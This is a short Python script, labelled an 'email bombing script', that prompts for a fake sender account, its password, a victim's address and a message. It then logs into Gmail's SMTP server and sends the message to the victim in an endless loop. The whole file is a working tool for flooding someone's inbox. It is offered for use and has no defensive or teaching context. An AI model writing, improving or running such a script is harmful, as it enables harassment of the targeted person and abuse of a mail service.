#email bombing script
import smtplib
a = input("fake E-Mail :")
b = input("password :")
v = input("Victim's mail adress :")
m = input("enter your bombing message :")
print("Bombing started,press 'ctrl+c' to stop bombing.")
s = smtplib.SMTP('smtp.gmail.com', 587)
s.starttls()
s.login(a, b)
while True:
    s.sendmail(a, v, m)




